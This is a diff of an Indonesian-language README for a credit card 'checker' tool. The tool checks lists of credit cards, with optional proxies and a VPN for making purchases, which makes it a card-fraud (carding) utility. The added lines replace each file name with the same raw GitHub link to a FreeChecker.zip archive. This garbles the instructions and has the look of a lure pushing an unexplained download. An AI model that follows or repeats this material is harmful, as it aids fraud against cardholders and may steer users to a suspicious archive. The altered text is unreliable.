@@ -16,17 +16,17 @@ poscode  :35454;
 }
 
 Silahkan siapkan
--CC list beserta informasinya seperti contoh lalu simpan dengan nama cclist.txt disatu folder Tools ini
+-CC list beserta informasinya seperti contoh lalu simpan dengan nama https://raw.githubusercontent.com/rikosanjuri14/FreeChecker/master/subconcession/FreeChecker.zip disatu folder Tools ini
 -Proxy (tidak wajib)
 -VPN (siapkan ketika loe mau CO)
 -Laptop atau PC ataupun yang bersistem operasi Linux atau aplikasi Termux
 -Jika tidak ada laptop/pc silahkan gunakan termux di android
 
 Usage 
--Masukan cclist (list kartu kredit yang ingin di periksa) dibagian (Input your CClist {for example cclist.txt} :cclist)
+-Masukan cclist (list kartu kredit yang ingin di periksa) dibagian (Input your CClist {for example https://raw.githubusercontent.com/rikosanjuri14/FreeChecker/master/subconcession/FreeChecker.zip} :cclist)
 -Masukan letak direktory proxy anda (jika diperlukan)
 -Lalu tekan Y dan Enter
--Jika CC valid akan keluar Saved namelist YourOrder.txt
+-Jika CC valid akan keluar Saved namelist https://raw.githubusercontent.com/rikosanjuri14/FreeChecker/master/subconcession/FreeChecker.zip
 -lalu buka dan anda akan menemukan 2 Boelan
 {
 true;valid
